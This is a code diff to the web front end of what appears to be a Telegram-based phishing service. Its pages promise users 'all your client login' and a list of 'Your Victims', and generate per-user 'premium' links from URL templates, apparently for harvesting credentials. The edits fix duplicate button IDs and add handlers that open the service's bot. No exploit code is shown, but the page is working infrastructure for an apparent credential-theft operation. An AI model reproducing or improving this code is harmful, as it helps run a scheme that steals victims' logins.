@@ -92,7 +92,7 @@
     <!-- Home Section -->
     <section id="home" class="page active">
       <p>Open the bot to receive all your client login.</p>
-      <button id="openBotBtn" class="btn"> Click here to see all your client login</button>
+      <button id="openBotBtnHome" class="btn"> Click here to see all your client login</button>
       <ul id="freeLinksList" class="link-list"></ul>
     </section>
 
@@ -111,7 +111,7 @@
     <section id="victim" class="page" style="text-align:center;">
       <h2>Your Victims</h2>
       <p>Open the bot to view all your victims.</p>
-      <button id="openBotBtn" class="btn">👉 Open Bot</button>
+      <button id="openBotBtnVictim" class="btn">👉 Open Bot</button>
     </section>
 
     <!-- Donate Section -->
@@ -141,7 +141,6 @@
     const freeLinksList = document.getElementById('freeLinksList');
     const premiumContent = document.getElementById('premiumContent');
     const donationInfo = document.getElementById('donationInfo');
-    const openBotBtn = document.getElementById('openBotBtn');
 
     const navButtons = {
       home: document.getElementById('navHome'),
@@ -225,66 +224,66 @@
 
     // Premium links renderer
     function renderPremiumLinks() {
-  if (!telegramId) {
-    premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Cannot detect your Telegram ID. Please open this WebApp inside Telegram.</p>`;
-    return;
-  }
-  if (typeof premiumUsers === "undefined") {
-    premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Premium list is missing. Please check premiumlist.js.</p>`;
-    return;
-  }
+      if (!telegramId) {
+        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Cannot detect your Telegram ID. Please open this WebApp inside Telegram.</p>`;
+        return;
+      }
+      if (typeof premiumUsers === "undefined") {
+        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Premium list is missing. Please check premiumlist.js.</p>`;
+        return;
+      }
 
-  if (premiumUsers.includes(telegramId)) {
-    // ✅ If premium → show the links with copy + open
-    premiumContent.innerHTML = "";
-    const ul = document.createElement("ul");
-    ul.className = "link-list";
+      if (premiumUsers.includes(telegramId)) {
+        // ✅ If premium → show the links with copy + open
+        premiumContent.innerHTML = "";
+        const ul = document.createElement("ul");
+        ul.className = "link-list";
 
-    premiumLinks.forEach(link => {
-      const li = document.createElement("li");
+        premiumLinks.forEach(link => {
+          const li = document.createElement("li");
 
-      const img = document.createElement("img");
-      img.src = link.image;
-      img.alt = link.name;
+          const img = document.createElement("img");
+          img.src = link.image;
+          img.alt = link.name;
 
-      const fullUrl = formatUrl(link.urlTemplate);
+          const fullUrl = formatUrl(link.urlTemplate);
 
-      const nameText = document.createElement("div");
-      nameText.textContent = link.name;
-      nameText.style.flexGrow = "1";
-      nameText.style.marginRight = "15px";
-      nameText.style.fontWeight = "600";
-      nameText.style.fontSize = "1rem";
+          const nameText = document.createElement("div");
+          nameText.textContent = link.name;
+          nameText.style.flexGrow = "1";
+          nameText.style.marginRight = "15px";
+          nameText.style.fontWeight = "600";
+          nameText.style.fontSize = "1rem";
 
-      const copyBtn = document.createElement("button");
-      copyBtn.textContent = "Copy";
-      copyBtn.className = "btn";
-      copyBtn.style.marginRight = "8px";
-      copyBtn.addEventListener("click", () => {
-        navigator.clipboard.writeText(fullUrl).then(() => {
-          copyBtn.textContent = "Copied!";
-          setTimeout(() => (copyBtn.textContent = "Copy"), 1500);
+          const copyBtn = document.createElement("button");
+          copyBtn.textContent = "Copy";
+          copyBtn.className = "btn";
+          copyBtn.style.marginRight = "8px";
+          copyBtn.addEventListener("click", () => {
+            navigator.clipboard.writeText(fullUrl).then(() => {
+              copyBtn.textContent = "Copied!";
+              setTimeout(() => (copyBtn.textContent = "Copy"), 1500);
+            });
+          });
+
+          const openBtn = document.createElement("button");
+          openBtn.textContent = "Open";
+          openBtn.className = "btn";
+          openBtn.addEventListener("click", () => {
+            window.open(fullUrl, "_blank", "noopener");
+          });
+
+          li.appendChild(img);
+          li.appendChild(nameText);
+          li.appendChild(copyBtn);
+          li.appendChild(openBtn);
+
+          ul.appendChild(li);
         });
-      });
 
-      const openBtn = document.createElement("button");
-      openBtn.textContent = "Open";
-      openBtn.className = "btn";
-      openBtn.addEventListener("click", () => {
-        window.open(fullUrl, "_blank", "noopener");
-      });
+        premiumContent.appendChild(ul);
 
-      li.appendChild(img);
-      li.appendChild(nameText);
-      li.appendChild(copyBtn);
-      li.appendChild(openBtn);
-
-      ul.appendChild(li);
-    });
-
-    premiumContent.appendChild(ul);
-
-  } else {
+      } else {
     // ❌ If NOT premium → show your upgrade message
     premiumContent.innerHTML = `
       <div style="max-width:500px;margin:20px auto;padding:16px;border-radius:16px;background:#151933;color:#e9ecff;font-family:system-ui,Roboto,Arial;">
@@ -315,9 +314,14 @@
         </div>
       </div>
     `;
-  }
-}
-    openBotBtn.addEventListener("click", () => {
+      }
+    }
+
+    // ✅ Updated event listeners for both buttons
+    document.getElementById("openBotBtnHome").addEventListener("click", () => {
+      window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank");
+    });
+    document.getElementById("openBotBtnVictim").addEventListener("click", () => {
       window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank");
     });
 
@@ -352,4 +356,4 @@
   </script>
   <script src="ads.js"></script>
 </body>
-</html>
+</html> 
